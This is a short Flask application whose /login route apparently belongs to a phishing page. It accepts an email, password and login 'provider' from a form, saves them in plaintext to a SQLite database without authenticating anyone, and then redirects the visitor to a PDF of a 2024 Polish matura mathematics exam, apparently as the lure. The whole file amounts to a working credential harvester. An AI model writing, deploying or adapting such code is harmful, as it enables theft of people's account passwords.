import os

from flask import Flask, render_template, request, redirect, jsonify
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Define the User model
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), nullable=False)
    password = db.Column(db.String(120), nullable=False)
    provider = db.Column(db.String(50), nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    provider = request.form['provider']

    # Save the user credentials in the database
    new_user = User(email=email, password=password, provider=provider)
    db.session.add(new_user)
    db.session.commit()

    # Return JSON response for AJAX request
    return jsonify({'status': 'success', 'redirect_url': 'https://arkusze.pl/maturalne/matematyka-2024-czerwiec-matura-podstawowa.pdf'})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=True)
